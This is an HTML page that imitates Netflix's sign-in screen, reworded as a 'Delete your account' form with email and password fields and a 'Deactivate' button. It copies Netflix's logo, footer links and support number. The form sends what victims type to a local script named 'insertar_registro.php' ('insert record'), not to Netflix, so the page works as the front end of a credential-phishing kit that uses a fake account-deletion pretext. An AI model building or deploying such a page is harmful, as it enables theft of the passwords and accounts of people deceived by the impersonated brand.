<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
    <link rel="stylesheet" href="style/style.css">
    <link rel="icon" href="img/logo.png">
    <title>Netflix</title>
    
</head>
<body>
    <div class="upper">
        <div class="logo">
            <a href="#">
                <img src="img/Netflix-Logo.png" class="img-logo"/>
            </a>
        </div>
        <div class="login-div">
            <form class="login" action="insertar_registro.php">
                <h1>Delete your account</h1>
                <div class="input-text">
                    <input type="text" id="email" name="email" placeholder="Email or phone number" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
                    <div class="warning-input" id="warningEmail">
                        Please enter a valid email or phone number.
                    </div>
                </div>
                
                <div class="input-text">
                    <input type="password" id="password" name="password" placeholder="Password" onfocus="inputOnFocus(this)" onblur="inputOnBlur(this)"/>
                    <div class="warning-input" id="warningPassword">
                        Your password must contain between 4 and 60 characters.
                    </div>
                </div>
                
                <div>
                    <button class="signin-button">Deactivate</button>
                </div>
                <div class="remember-flex">
                    <div>
                        <input type="checkbox">
                        <label class="color_text">Remember me</label>
                    </div>
                    <div class="help">
                        <a class="color_text" href="#">Need help?</a>
                    </div>
                </div>
                <div class="login-face">
                    <img src="img/fb-icon.png" height="20"/><a href="#" class="color_link log_face">Login with Facebook</a>
                </div>
                <div class="new-members">
                    New to Netflix? <a href="#" class="signup-link">Sign up now</a>.
                </div>
                <div class="protection color_link help">
                    This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a>
                </div>
            </form>
        </div>
    </div>
    <div class="bottom">
        <div class="bottom-width">
            Questions? Call <a href="tel:1-844-542-4813" class="tel-link">1-844-542-4813</a>
            <div>
                <ul class="bottom-flex">
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            FAQ
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Help Center
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Terms of Use
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Privacy
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Cookie Preferences
                        </a>
                    </li>
                    <li class="list-bottom">
                        <a href="#" class="link-bottom">
                            Corporate information
                        </a>
                    </li>
                </ul>
            </div>
            <div>
                <select class="fa select-language">
                    <option> &#xf0ac; &nbsp;&nbsp;&nbsp;English</option>
                    <option> &#xf0ac; &nbsp;&nbsp;&nbsp;Fran&ccedil;ais</option>
                </select>
            </div>
        </div>
    </div>
    <script src="js/script.js"></script>
</body>
</html>